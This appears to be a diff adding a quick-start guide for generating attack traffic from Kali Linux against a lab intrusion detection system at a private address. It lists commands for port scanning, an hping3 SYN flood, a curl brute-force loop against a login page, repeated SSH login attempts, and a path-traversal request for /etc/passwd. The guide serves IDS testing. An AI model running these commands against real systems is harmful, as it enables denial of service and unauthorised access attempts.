@@ -1,0 +1,82 @@
+===========================================
+KALI LINUX - QUICK START GUIDE
+Copy this file to Kali Linux
+===========================================
+
+STEP 1: Copy the script to Kali Linux
+--------------------------------------
+Method 1: Copy file "kali-attacks.sh" to Kali
+Method 2: Create new file and paste the script content
+
+STEP 2: Make it executable
+--------------------------------------
+chmod +x kali-attacks.sh
+
+STEP 3: Edit the IP address (if needed)
+--------------------------------------
+nano kali-attacks.sh
+# Change this line: IDS_IP="192.168.100.4"
+# Press Ctrl+X, then Y, then Enter to save
+
+STEP 4: Run the script
+--------------------------------------
+./kali-attacks.sh
+
+STEP 5: Select attack type from menu
+--------------------------------------
+1 = Port Scan
+2 = DoS Attack
+3 = Brute Force
+4 = R2L Attack
+5 = U2R Attack
+6 = Mixed Attack
+7 = Test ALL (runs all 6 attacks)
+8 = Exit
+
+===========================================
+MANUAL COMMANDS (if script doesn't work)
+===========================================
+
+# Port Scan
+nmap -p 1-500 192.168.100.4
+
+# DoS (press Ctrl+C to stop)
+hping3 -S -p 5001 --flood 192.168.100.4
+
+# Brute Force
+for i in {1..15}; do
+  curl -X POST http://192.168.100.4:8080/login \
+    -d "username=admin&password=wrong$i"
+  sleep 0.3
+done
+
+# R2L
+for i in {1..8}; do
+  ssh -o ConnectTimeout=1 fakeuser$i@192.168.100.4 "exit" 2>&1
+done
+
+# U2R
+curl "http://192.168.100.4:8080/../../etc/passwd"
+
+# Mixed
+nmap -p 1-200 192.168.100.4 &
+hping3 -S -p 5001 -c 100 192.168.100.4
+
+===========================================
+VIEW RESULTS
+===========================================
+
+Open browser: http://192.168.100.4:5173
+Go to: Monitoring tab
+Look for: 🚨 ATTACK DETECTED badges
+
+===========================================
+STOP ALL ATTACKS
+===========================================
+
+pkill nmap
+pkill hping3
+pkill curl
+
+===========================================
+
